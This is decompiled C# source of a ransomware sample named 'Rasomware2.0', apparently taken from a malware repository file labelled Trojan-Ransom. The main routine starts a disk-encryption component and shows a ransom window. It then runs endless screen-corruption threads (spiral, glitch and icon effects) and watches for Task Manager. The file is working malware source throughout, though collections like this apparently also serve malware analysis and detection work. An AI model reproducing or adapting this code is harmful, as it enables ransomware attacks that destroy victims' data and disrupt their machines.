// Decompiled with JetBrains decompiler
// Type: Rasomware2._0.Program
// Assembly: Rasomware2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2779CBD6-B05D-4134-88E0-F6173B4E0DD8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-2ef5f5e60a1caf03985987de9c67e59a516184f2dcca56702620102cbeeb5ffe.exe

using Encrypt.Core;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Rasomware2._0
{
  internal class Program
  {
    private static int width = Program.GetSystemMetrics(0);
    private static int height = Program.GetSystemMetrics(1);
    private static readonly HDD _HDD = new HDD();

    [DllImport("gdi32")]
    private static extern IntPtr CreateDC(
      string lpszDriver,
      string lpszDevice,
      string lpszOutput,
      string lpInitData);

    [DllImport("user32")]
    private static extern int GetSystemMetrics(int smIndex);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr hdcDest,
      int xDest,
      int yDest,
      int wDest,
      int hDest,
      IntPtr hdcSrc,
      int xSrc,
      int ySrc,
      int wSrc,
      int hSrc,
      int rop);

    [DllImport("user32.dll")]
    private static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

    [DllImport("gdi32.dll")]
    private static extern bool PlgBlt(
      IntPtr hdcDest,
      Program.POINT[] lpPoint,
      IntPtr hdcSrc,
      int nXSrc,
      int nYSrc,
      int nWidth,
      int nHeight,
      IntPtr hbmMask,
      int xMask,
      int yMask);

    [DllImport("user32")]
    private static extern bool GetCursorPos(out Program.POINT lpPoint);

    private static void spiral()
    {
label_3:
      for (int index = 0; index < 100; ++index)
      {
        IntPtr dc = Program.CreateDC("DISPLAY", (string) null, (string) null, (string) null);
        Program.POINT point1 = new Program.POINT();
        point1.x = 0;
        point1.y = Program.height - index;
        Program.POINT point2 = point1;
        point1 = new Program.POINT();
        point1.x = index;
        point1.y = 0;
        Program.POINT point3 = point1;
        point1 = new Program.POINT();
        point1.x = Program.width - index;
        point1.y = Program.height;
        Program.POINT point4 = point1;
        Program.PlgBlt(dc, new Program.POINT[3]
        {
          point2,
          point3,
          point4
        }, dc, 0, 0, Program.width, Program.height, IntPtr.Zero, 0, 0);
      }
      goto label_3;
    }

    private static void Warning()
    {
      while (true)
      {
        Random random = new Random();
        IntPtr dc = Program.CreateDC("DISPLAY", (string) null, (string) null, (string) null);
        IntPtr hIcon = Program.LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
        Program.DrawIcon(dc, random.Next(0, Program.width), random.Next(0, Program.height), hIcon);
      }
    }

    private static void Glitch()
    {
      while (true)
      {
        IntPtr dc = Program.CreateDC("DISPLAY", (string) null, (string) null, (string) null);
        Random random = new Random();
        int xDest = random.Next(0, Program.width);
        int yDest = random.Next(0, Program.height);
        int xSrc = random.Next(0, Program.width);
        int ySrc = random.Next(0, Program.height);
        int wDest = random.Next(0, Program.width);
        int hDest = random.Next(0, Program.height);
        int wSrc = random.Next(0, Program.width);
        int hSrc = random.Next(0, Program.height);
        Program.StretchBlt(dc, xDest, yDest, wDest, hDest, dc, xSrc, ySrc, wSrc, hSrc, 6684742);
      }
    }

    [STAThread]
    private static void Main()
    {
      Program._HDD.Start();
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new Ransomware2());
      Thread.Sleep(2000);
      Thread thread1 = new Thread(new ThreadStart(Program.spiral));
      Thread thread2 = new Thread(new ThreadStart(Program.Glitch));
      Thread thread3 = new Thread(new ThreadStart(Program.Warning));
      thread1.Start();
      thread2.Start();
      thread3.Start();
      while (true)
      {
        if (Process.GetProcessesByName("taskmgr").Length != 0)
          Process.GetCurrentProcess().Kill();
      }
    }

    private struct POINT
    {
      public int x;
      public int y;
    }
  }
}
